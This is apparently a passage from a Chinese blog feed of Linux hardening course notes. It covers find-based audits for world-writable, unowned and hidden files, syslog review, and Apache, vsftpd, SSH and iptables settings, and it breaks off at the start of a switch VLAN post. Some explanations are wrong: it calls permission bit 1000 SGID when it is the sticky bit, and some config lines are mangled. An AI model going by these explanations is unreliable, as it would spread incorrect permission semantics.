命令只在同一个设备（或文件系统）中搜索，不跨越其他设备。  </span><br><span class="line">* `-<span class="built_in">type</span> d`：只搜索目录。  </span><br><span class="line">* `(-perm -0002 -a ! -perm -1000)`：这是一个复杂的权限检查。  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">+ `-perm -0002`：搜索所有设置了“其他用户有写权限”的目录。  </span><br><span class="line">+ `-a`：逻辑AND，确保两个条件都为真。  </span><br><span class="line">+ `! -perm -1000`：排除所有设置了“用户有执行权限且其他用户和组没有任何权限”的目录。这通常用于排除设置了SGID位（<span class="built_in">set</span> group ID）的目录。  </span><br><span class="line">* `-<span class="built_in">print</span>`：对于每一个满足条件的目录，打印其路径。</span><br></pre></td></tr></table></figure><h2 id="课时十二-查找任何人都有写权限的文件"><a href="#课时十二-查找任何人都有写权限的文件" class="headerlink" title="课时十二 查找任何人都有写权限的文件"></a>课时十二 查找任何人都有写权限的文件</h2><p>用下面的命令查找任何人都有写权限的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PART in `grep -v ^# /etc/fstab | awk &#x27;($6!=&quot;0&quot;)&#123;print $2&#125;&#x27;`;do find $PART -xdev -type f \(-perm -0002 -a ! -perm -1000\) -print done</span><br></pre></td></tr></table></figure><p>这个命令组合的目的是在系统中查找所有在 <code>/etc/fstab</code> 中定义的非注释且 <code>fs_passno</code> 不为 <code>0</code> 的挂载点，并在这些挂载点中搜索所有设置了“其他用户有写权限”但没有设置SGID位的文件，并打印这些文件的路径。这通常用于安全审计，以确保没有敏感文件被设置为可以被任何用户写入。</p><p>1.<strong>grep</strong> 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v ^<span class="comment"># /etc/fstab</span></span><br></pre></td></tr></table></figure><ul><li><code>grep</code> 是一个文本搜索工具，用于搜索文件中的文本模式。</li><li><code>-v</code> 选项告诉 <code>grep</code> 排除（或反转）匹配的行。</li><li><code>^#</code> 是一个正则表达式，匹配以 <code>#</code> 符号开头的行。在 <code>/etc/fstab</code> 文件中，<code>#</code> 通常用于注释行。因此，<code>grep -v ^# /etc/fstab</code> 会输出所有非注释行的内容。</li></ul><p>2.<strong>awk</strong> 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;($6!=&quot;0&quot;)&#123;print $2&#125;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>这个 <code>awk</code> 命令检查第六列（字段）是否不等于 <code>&quot;0&quot;</code>。在 <code>/etc/fstab</code> 文件中，第六列通常表示文件系统检查的顺序（<code>fs_passno</code>），其中 <code>0</code> 表示不检查。</li><li>如果第六列不等于 <code>&quot;0&quot;</code>，则打印第二列（即文件系统挂载点）</li></ul><p>3.<strong>for</strong> 循环：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> PART <span class="keyword">in</span> `...grep和awk命令...`; <span class="keyword">do</span> ... <span class="keyword">done</span></span><br></pre></td></tr></table></figure><ul><li>这是一个 <code>for</code> 循环，它会遍历 <code>grep</code> 和 <code>awk</code> 命令的输出结果（即所有非注释且 <code>fs_passno</code> 不为 <code>0</code> 的挂载点）。</li><li>对于每一个 <code>PART</code>（挂载点），它都会执行 <code>do</code> 和 <code>done</code> 之间的命令。</li></ul><p>4.<strong>find</strong> 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find <span class="variable">$PART</span> -xdev -<span class="built_in">type</span> f \(-perm -0002 -a ! -perm -1000\) -<span class="built_in">print</span></span><br></pre></td></tr></table></figure><ul><li><code>find</code> 命令用于在文件系统中搜索文件。</li><li><code>-type f</code>：这次搜索的是文件（而不是目录）。</li><li>权限检查 <code>(-perm -0002 -a ! -perm -1000)</code> 与之前的命令相同：搜索所有设置了“其他用户有写权限”的文件，并排除设置了SGID位（<code>set group ID</code>）的文件。</li><li><code>-print</code>：对于每一个满足条件的文件，打印其路径。</li></ul><h2 id="课时十三-检查没有属主的文件"><a href="#课时十三-检查没有属主的文件" class="headerlink" title="课时十三 检查没有属主的文件"></a>课时十三 检查没有属主的文件</h2><p>发现没有属主的文件往往就意味着有黑客入侵你的系统了。不能允许没有主人的文件存在。如果在系统中发现了没有主人的文件或目录，先查看它的完整性，如果一切正常，给它一个主人。有时候卸载程序可能会出现一些没有主人的文件或目录，在这种情况下可以把这些文件和目录删除掉。</p><p>用下面的命令查找没有属主的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PART in `grep -v ^# /etc/fstab | awk &#x27;($6!=&quot;0&quot;)&#123;print $2&#125;&#x27;`;do find $PART -nouser -o -nogroup -print done</span><br></pre></td></tr></table></figure><p>这个命令组合使用了 <code>grep</code>、<code>awk</code> 和 <code>find</code> 命令来搜索文件系统中可能存在的没有关联用户或组的文件。我们来逐步分析这个命令：</p><p>1.<strong>grep</strong> 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v ^<span class="comment"># /etc/fstab</span></span><br></pre></td></tr></table></figure><ul><li>如同之前，<code>grep -v ^# /etc/fstab</code> 用来过滤掉 <code>/etc/fstab</code> 文件中的注释行。</li></ul><p>2.<strong>awk</strong> 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;($6!=&quot;0&quot;)&#123;print $2&#125;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>这个 <code>awk</code> 命令依然检查 <code>/etc/fstab</code> 文件的第六列（<code>fs_passno</code>），确保它不等于 <code>&quot;0&quot;</code>。</li><li>如果第六列不等于 <code>&quot;0&quot;</code>，则打印第二列（文件系统挂载点）。</li></ul><p>3.<strong>for</strong> 循环：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> PART <span class="keyword">in</span> `...grep和awk命令...`; <span class="keyword">do</span> ... <span class="keyword">done</span></span><br></pre></td></tr></table></figure><ul><li>这是一个 <code>for</code> 循环，它会遍历所有由 <code>grep</code> 和 <code>awk</code> 命令输出的非注释且 <code>fs_passno</code> 不为 <code>0</code> 的挂载点。</li></ul><p>4.<strong>find</strong> 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find <span class="variable">$PART</span> -nouser -o -nogroup -<span class="built_in">print</span></span><br></pre></td></tr></table></figure><ul><li><code>find</code> 命令在指定的挂载点 <code>$PART</code> 中搜索文件。</li><li><code>-nouser</code>：搜索没有关联用户的文件。这些文件通常是因为文件的所有者被删除，但文件依然存在。</li><li><code>-o</code>：逻辑 OR，表示接下来的条件也是搜索的一部分。</li><li><code>-nogroup</code>：搜索没有关联组的文件。这些文件通常是因为文件的组被删除，但文件依然存在。</li><li><code>-print</code>：打印满足条件的文件的路径。</li></ul><h2 id="课时十四-检查异常隐含文件"><a href="#课时十四-检查异常隐含文件" class="headerlink" title="课时十四 检查异常隐含文件"></a>课时十四 检查异常隐含文件</h2><p>异常隐藏文件可能是隐藏的黑客工具或者其它一些信息（口令破解程序、其它系统的口令文件，等等）。常用的技术就是用一些特殊的名，如：“…”、“..”或“..＾G”，来隐含文件或目录。</p><p>用下面的命令检查异常隐含文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -xdev -name <span class="string">&quot;..*&quot;</span> -<span class="built_in">print</span></span><br><span class="line">find / -xdev -name <span class="string">&quot;...*&quot;</span> -<span class="built_in">print</span></span><br></pre></td></tr></table></figure><ul><li><code>/</code>：从文件系统的根目录开始搜索。</li><li><code>-xdev</code>：限制搜索到同一文件系统内，不会跨越到其他设备或挂载点。</li><li><code>-name &quot;..*&quot;</code>：搜索文件名以 <code>..</code> 开头的文件。在UNIX和Linux文件系统中，<code>..</code> 通常表示上一级目录，但这里它被用作文件名的一部分。因此，这个命令将匹配所有以 <code>..</code> 开头的文件名。</li><li><code>-print</code>：打印找到的文件路径。</li></ul><h2 id="课时十五-登录超时设置"><a href="#课时十五-登录超时设置" class="headerlink" title="课时十五 登录超时设置"></a>课时十五 登录超时设置</h2><p>设置登录超时时间为5分钟：</p><p>编辑／etc／profile文件，添加以下内容（单位为秒）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TMOUT=300</span><br></pre></td></tr></table></figure><h2 id="课时十六-syslog登录事件记录"><a href="#课时十六-syslog登录事件记录" class="headerlink" title="课时十六 syslog登录事件记录"></a>课时十六 syslog登录事件记录</h2><p><code>/etc/syslog.conf文件</code></p><p>syslog采用可配置的、统一的系统登记程序，随时从系统各处接受log请求，然后根据／etc／syslog.conf中的预先设定把log信息写入相应文件中、邮寄给特定用户或者直接以消息的方式发往控制台。</p><p>syslog.conf文件是一个传统的 Unix&#x2F;Linux 系统日志配置文件，用于定义哪些类型的消息应该被记录到哪些日志文件，以及如何将消息发送到其他机器上的 syslog 服务。</p><p>syslog.conf的格式：</p><p>一项配置记录：“选项”（selector）和“动作”（action），Tab制表符进行分隔（空格间隔无效）。</p><p>“选项”又由一个或多个形如“类型.级别”格式的保留字段组合而成，各保留字段间用分号分隔。</p><p>例：mail.* &#x2F;var&#x2F;log&#x2F;mail.log </p><p><strong>级别：</strong><br>emerg     紧急，通常应广播到所有用户；<br>alert      告警，当前状态必须立即进行纠正；<br>crit        关键状态的警告。例如，硬件故障；<br>err        其它错误；<br>Warn      警告；</p><p><strong>级别：代表信息的重要性</strong><br>notice     注意；非错误状态的报告，但应特别处理；<br>info       通报信息；<br>debug      调试程序时的信息；<br>none       通常调试程序时用，指示带有none级别的类型产生的信息无需送出</p><p><strong>动作：</strong><br>&#x2F;filename   日志文件。 由绝对路径指出的文件名，此文件必须事先建立<br>@host     远程主机；@符号后面可以是IP也可以是域名；<br>useruser2指定用户。女如果指定用户已登录，那么他们将收到信息；所有用户，所有已登录的用户都将收到信息</p><p><code>syslog.conf登录事件记录</code></p><p>利用syslog登录事件记录</p><p>查看&#x2F;etc&#x2F;syslog.conf文件，是否包含authpriv，存在authpriv即启用了事件记录，并且后面就是日志文件的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/syslog.conf</span><br></pre></td></tr></table></figure><ol><li><p><strong>确定日志文件的位置</strong>：</p><ul><li>对于传统的<code>syslog</code>，登录事件通常记录在<code>/var/log/secure</code>或<code>/var/log/auth.log</code>中。</li><li>对于<code>rsyslog</code>，你可能需要查看<code>/var/log/syslog</code>或<code>/var/log/auth.log</code>，具体取决于你的配置。</li><li>对于<code>syslog-ng</code>，日志文件的位置可能会有所不同，取决于你的配置。</li></ul></li><li><p><strong>查看日志文件</strong>：<br>你可以使用<code>cat</code>、<code>tail</code>、<code>less</code>或<code>grep</code>等命令来查看和搜索日志文件。例如，要查看<code>/var/log/secure</code>文件中的登录事件，你可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/secure</span><br></pre></td></tr></table></figure><p>或者，如果你只想查看最近的登录事件，可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">tail</span> -f /var/log/secure</span><br></pre></td></tr></table></figure><p>要搜索特定的登录事件，例如用户”john”的登录尝试，可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep <span class="string">&quot;john&quot;</span> /var/log/secure</span><br></pre></td></tr></table></figure></li><li><p><strong>检查syslog配置文件</strong>：<br>要确定哪些登录事件被记录到syslog，你需要查看syslog的配置文件。对于<code>rsyslog</code>，这通常是<code>/etc/rsyslog.conf</code>或<code>/etc/rsyslog.d/</code>目录下的文件。对于<code>syslog-ng</code>，配置文件通常是<code>/etc/syslog-ng/syslog-ng.conf</code>。</p><p>在配置文件中，你可能会找到类似于以下的行，这些行定义了哪些消息应该被记录到哪个文件或远程主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth,authpriv.*                 /var/log/secure</span><br></pre></td></tr></table></figure><p>这表示所有与认证相关的消息（<code>auth</code>和<code>authpriv</code>设施）都被记录到<code>/var/log/secure</code>文件中。</p></li><li><p><strong>重启syslog服务</strong>：<br>如果你对配置文件进行了更改，记得重启syslog服务以应用更改。对于<code>rsyslog</code>，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart rsyslog</span><br></pre></td></tr></table></figure><p>对于<code>syslog-ng</code>，使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart syslog-ng</span><br></pre></td></tr></table></figure></li><li><p><strong>使用日志分析工具</strong>：<br>对于大量的日志数据，手动搜索可能不太高效。你可以考虑使用日志分析工具，如<code>logwatch</code>、<code>multitail</code>、<code>journalctl</code>（对于使用systemd的系统）等，来帮助你更有效地分析和查看日志。</p></li></ol><p>syslog 登录事件记录主要用于以下几个目的：</p><ol><li><strong>安全审计</strong>：syslog 可以记录所有与登录相关的事件，包括成功的登录尝试、失败的登录尝试、账户锁定等。这些记录可以用于分析系统中是否存在未经授权的访问尝试或其他安全事件。</li><li><strong>故障排查</strong>：当系统出现问题或用户报告无法登录时，syslog 登录事件记录可以帮助管理员快速定位问题。例如，如果多个用户报告无法登录，管理员可以查看syslog记录来查找是否有任何相关的错误或警告消息。</li><li><strong>合规性和监管</strong>：在某些行业或地区，法规可能要求保留特定的日志记录以满足合规性要求。syslog 登录事件记录可以作为这些合规性审计的一部分。</li><li><strong>系统监控</strong>：通过实时监控syslog登录事件记录，管理员可以及时发现任何可疑的活动或异常行为，从而采取适当的措施来应对潜在的安全威胁。</li><li><strong>用户行为分析</strong>：通过分析syslog登录事件记录，管理员可以了解用户的行为模式，例如登录时间、登录频率、登录来源等。这有助于识别异常的用户行为或潜在的安全风险。</li></ol><p>总之，syslog 登录事件记录是系统安全和管理的重要工具，它提供了关于用户登录活动的详细信息，有助于管理员维护系统的安全性和稳定性。</p><h2 id="课时十七-syslog-conf的配置审核"><a href="#课时十七-syslog-conf的配置审核" class="headerlink" title="课时十七 syslog.conf的配置审核"></a>课时十七 syslog.conf的配置审核</h2><p>如何审核系统的syslog.con的的配置满足要求呢？<br>执行more&#x2F;etc&#x2F;syslog.conf，查看是否包含下列项目：<br>Kern.*@host<br><em>.err@host<br>authpriv. @host<br>.info@host<br>mail.none@host<br>cron.none @host<br>.emerg@host<br>local7.</em>@host</p><h2 id="课时十八-Web"><a href="#课时十八-Web" class="headerlink" title="课时十八 Web"></a>课时十八 Web</h2><p><code>隐藏Apache版本信息</code>，web服务器默认可以暴露apache版本信息<br><code>修改Apache配置文件/etc/httpd.conf，设置以下参数：</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ServerSignatureff  //禁止服务器端生成文档的页脚！</span><br><span class="line">ServerTokensProd    //不包含OS类型和编译进的模块描述信息</span><br></pre></td></tr></table></figure><p><code>禁止访问指定类型文件</code><br><code>修改Apache配置文件/etc/httpd.conf，设置以下参数：</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.(htaccess|htpasswd|ini|conf|jpg|gif|png|bmp|sh)&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>&lt;FilesMatch “.(htaccess|htpasswd|ini|conf|jpg|gif|png|bmp|sh）&gt;: 这是一个<FilesMatch>指令，它用于匹配文件名模式。在这里，它匹配任何以.htaccess、.htpasswd、.ini、.conf、.jpg、.gif、.png、.bmp、或.sh结尾的文件。</FilesMatch></p><p>Order allow,deny: 这个指令定义了允许和拒绝访问的顺序。allow指令在前，deny在后。这意味着，如果一个用户匹配到allow规则，他们将被允许访问；否则，他们将匹配deny规则。</p><p>Deny from all: 这个指令告诉服务器拒绝所有用户的访问。由于Order指令设置了先允许后拒绝的顺序，这条规则实际上会拒绝所有尝试访问匹配文件类型的用户，因为没有任何allow规则在前面允许他们的访问。</p><p>: 这是<FilesMatch>指令的结束标签。</FilesMatch></p><p>在更现代的Apache配置中，<code>Order</code>, <code>Allow</code>, 和 <code>Deny</code> 指令已被 <code>Require</code> 指令取代，用于更简洁和安全地控制访问权限。例如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;.(htaccess|htpasswd|ini|conf|sh)$&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> denied  </span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><p>这将达到同样的效果，即禁止所有用户访问匹配的文件类型。</p><h2 id="课时十九-FTP"><a href="#课时十九-FTP" class="headerlink" title="课时十九 FTP"></a>课时十九 FTP</h2><p>FTP（File Transfer Protocol，文件传输协议）的匿名用户的名称账号通常是“anonymous”。这是大多数提供公共资料的FTP服务器都提供的匿名服务，允许Internet用户随时访问这些服务器而不需要预先向服务器申请账号。在匿名FTP服务中，用户可以使用“anonymous”作为账号，而密码通常是“guest”或者用户的电子邮箱地址。</p><p>为了保证FTP服务器的安全，几乎所有匿名服务器都只允许用户从服务器上下载文件，而不能上传或修改服务器上的内容。这是因为匿名用户没有经过身份验证，服务器无法确认其身份和权限，因此只能提供有限的访问权限。</p><p><code>禁止匿名用户访问及上传</code><br><code>修改vsftpd配置文件/etc/vsftpd/vsftpd.conf</code>，设置以下参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anonymous_enable=NO           //禁止匿名访问</span><br><span class="line">anon_upload_enable=NO          //禁止匿名用户上传文件</span><br><span class="line">anon_mkdir_write_enable=NO  //禁止匿名用户的写和创建目录的权限</span><br><span class="line">anon_other_write_enable=NO    //禁止匿名用户进行删除或者改名等操作</span><br></pre></td></tr></table></figure><p><code>限制服务器链接数</code></p><p><code>修改vsftpd配置文件/etc/vsftpd/vsftpd.conf</code>，设置以下参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">maxclients=10             //最大链接数</span><br><span class="line">max_per_ip=5              //每个IP的最大链接数</span><br></pre></td></tr></table></figure><h2 id="课时二十-SSH"><a href="#课时二十-SSH" class="headerlink" title="课时二十 SSH"></a>课时二十 SSH</h2><p><code>禁止root用户登录</code></p><p><code>修改ssh配置文件/etc/ssh/sshd_config</code>，设置以下参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure><p><code>禁止空密码用户登录</code></p><p><code>修改ssh配置文件/etc/ssh/sshd_config</code>，设置以下参数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitEmptyPasswords no</span><br></pre></td></tr></table></figure><p>SSH禁止root用户和空密码用户登录具有以下几个重要作用：</p><ol><li><strong>安全性增强</strong>：<ul><li><strong>禁止root用户登录</strong>：root用户拥有系统的最高权限，可以执行任何操作。如果root账户被恶意用户获取，那么整个系统都可能面临被完全控制的风险。通过禁止root用户直接通过SSH登录，可以大大降低这种风险。</li><li><strong>禁止空密码用户登录</strong>：空密码意味着没有设置密码，这意味着任何知道该用户名的人都可以无需任何验证即可登录。这显然是一个巨大的安全隐患。禁止空密码用户登录可以防止这种情况发生。</li></ul></li><li><strong>权限控制</strong>：<ul><li>通过禁止root用户直接登录，可以强制用户使用普通用户账户登录，然后通过sudo或其他机制提升权限。这样可以更好地控制和管理用户的权限。</li></ul></li><li><strong>审计和日志记录</strong>：<ul><li>当系统被攻击或发生问题时，审计和日志记录是非常重要的。如果允许root用户直接登录，那么攻击者可能会迅速隐藏其踪迹。通过禁止root登录，可以确保所有操作都通过普通用户账户进行，从而更容易追踪和审计。</li></ul></li><li><strong>遵循最佳实践</strong>：<ul><li>在系统管理和网络安全领域，禁止root用户和空密码用户直接通过SSH登录被广泛认为是最佳实践之一。这有助于确保系统的安全性和稳定性。</li></ul></li></ol><h2 id="课时二十一-iptables"><a href="#课时二十一-iptables" class="headerlink" title="课时二十一 iptables"></a>课时二十一 iptables</h2><p>iptables是一个网络包过滤器，用于在Linux系统中控制和过滤网络流量。包过滤防火墙（pack filtering）在网络层对数据包进行选择过滤，采用访问控制列表（AccesscontroltableACL）检查数据流的源地址，目的地址，源和目的端口，IP等信息。</p><p><code>iptables基础</code></p><p>1.规则（rules）：网络管理员预定义的条件<br>2.链（chains）：数据包传播的路径<br>3.表（tables）：内置3个表：filter表，nat表，mangle表</p><p>4.iptables命令格式：<br>    iptables[-t表]命令匹配动作<br>      动作选项：<br>     （1）ACCEPT      接收数据包（2）DROP        去弃数据包</p><p><code>iptables实例</code><br>1.查看filter表所有链的规则列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -nL</span><br></pre></td></tr></table></figure><ul><li><code>iptables</code>: 调用 iptables 工具。</li><li><code>-t filter</code>: 指定表（table）为 <code>filter</code>。<code>filter</code> 表是 iptables 中最常用的表，它包含用于处理数据包过滤的规则。</li><li><code>-n</code>: 使用数字格式显示地址和端口，而不是尝试解析主机名、网络名或服务名。</li><li><code>L</code>: 列出（List）规则。</li></ul><p>执行这个命令后，你会看到 <code>filter</code> 表中定义的所有规则。这通常包括 <code>INPUT</code>、<code>OUTPUT</code> 和 <code>FORWARD</code> 这三个链（chain）的规则，这些链分别用于处理进入、离开和转发通过系统的数据包。</p><p>2.清除已有iptables规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br></pre></td></tr></table></figure><p>iptables -F这个命令用于清空（Flush）指定链上的所有规则。如果不指定链名，该命令将清空所有链上的规则。</p><p>ptables -X这个命令用于删除（Delete）指定的用户自定义链。如果链中存在任何规则或引用，该命令会失败，除非使用 -f 选项强制删除链及其规则。</p><p>3.禁止IP为10.10.8.5的主机从eth0访问本机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -s 10.10.8.5 -i eth0 -j DROP</span><br></pre></td></tr></table></figure><ul><li><code>iptables</code>: 调用 iptables 工具。</li><li><code>-t filter</code>: 指定表（table）为 <code>filter</code>。<code>filter</code> 表用于处理数据包的过滤。</li><li><code>-A INPUT</code>: 在 <code>INPUT</code> 链（chain）中添加（Append）一条规则。<code>INPUT</code> 链用于处理进入系统的数据包。</li><li><code>-s 10.10.8.5</code>: 指定源 IP 地址为 <code>10.10.8.5</code>。这意味着规则仅适用于从该 IP 地址发出的数据包。</li><li><code>-i eth0</code>: 指定网络接口为 <code>eth0</code>。这意味着规则仅适用于通过该接口接收到的数据包。</li><li><code>-j DROP</code>: 指定目标动作为 <code>DROP</code>。这意味着匹配该规则的数据包将被丢弃，不会被传递或处理。</li></ul><p>4.禁止子网172.16.0.0&#x2F;16访问Web服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-t filter -A INPUT -s 172.16.0.0/16 -p tcp --dport 80 -j DROP</span><br></pre></td></tr></table></figure><ul><li><code>-s 172.16.0.0/16</code>: 指定源 IP 地址范围为 <code>172.16.0.0</code> 到 <code>172.16.255.255</code>。CIDR 表示法 <code>/16</code> 表示前 16 位是网络地址，后 16 位是主机地址。这意味着规则适用于从 <code>172.16.0.0</code> 到 <code>172.16.255.255</code> 范围内的所有 IP 地址发出的数据包。</li><li><code>-p tcp</code>: 指定协议类型为 TCP。</li><li><code>--dport 80</code>: 指定目标端口为 80，即 HTTP 服务的默认端口。</li><li><code>-j DROP</code>: 指定动作为 <code>DROP</code>，即丢弃匹配该规则的数据包。</li></ul><p>综合以上各个部分，这条命令的作用是：在 filter 表的 INPUT 链中添加一条规则，该规则将丢弃所有来自 172.16.0.0&#x2F;16的 IP 地址范围，且目标端口为 80（HTTP 服务）的 TCP 数据包。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;米好信息安全课程笔记&quot;&gt;&lt;a href=&quot;#米好信息安全课程笔记&quot; class=&quot;headerlink&quot; title=&quot;米好信息安全课程笔记&quot;&gt;&lt;/a&gt;米好信息安全课程笔记&lt;/h1&gt;&lt;h1 id=&quot;基础课程-Linux安全配置&quot;&gt;&lt;a href=&quot;#基础课程-Li</summary>
      
    
    
    
    <category term="笔记" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="米好信安" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/%E7%B1%B3%E5%A5%BD%E4%BF%A1%E5%AE%89/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="信息安全" scheme="https://w-sqrt7.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>网基实践题-交换机配置</title>
    <link href="https://w-sqrt7.github.io/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%85%8D%E7%BD%AE/"/>
    <id>https://w-sqrt7.github.io/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%85%8D%E7%BD%AE/</id>
    <published>2024-02-27T14:01:07.869Z</published>
    <updated>2024-03-02T07:29:56.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网基实践题-交换机配置"><a href="#网基实践题-交换机配置" class="headerlink" title="网基实践题-交换机配置"></a>网基实践题-交换机配置</h1><h2 id="二层交换机配置"><a href="#二层交换机配置" class="headerlink" title="二层交换机配置"></a>二层交换机配置</h2><h3 id="实验拓扑图："><a href="#实验拓扑图：" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h3><p><img src="/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%85%8D%E7%BD%AE/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-27%20220330.png" alt="屏幕截图 2024-02-27 220330"></p><h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><p>首先将各个主机的ip和子网掩码配置，网关这里可以不用在意</p><p>配置完成后可以发现4台主机之间是可以相互ping通的，因为是在同一网段内，我们的任务是配置两个vlan，使得vlan10的主机只和vlan10的主机相互通，vlan20的主机只和vlan20的主机相互通，进行如下配置</p><p>首先进行基础配置</p><p>LSW1的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname LSW1</span><br><span class="line">[LSW1]vlan batch 10 20</span><br><span class="line">[LSW1]int e0/0/1</span><br><span class="line">[LSW1-Ethernet0/0/1]port link-type access</span><br><span class="line">[LSW1-Ethernet0/0/1]port default vlan 10</span><br><span class="line">[LSW1-Ethernet0/0/1]quit</span><br><span class="line">[LSW1]int e0/0/2</span><br><span class="line">[LSW1-Ethernet0/0/2]port link-type access</span><br><span class="line">[LSW1-Ethernet0/0/2]port default vlan 20</span><br><span class="line">[LSW1-Ethernet0/0/2]quit</span><br></pre></td></tr></table></figure><p>LSW2的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span 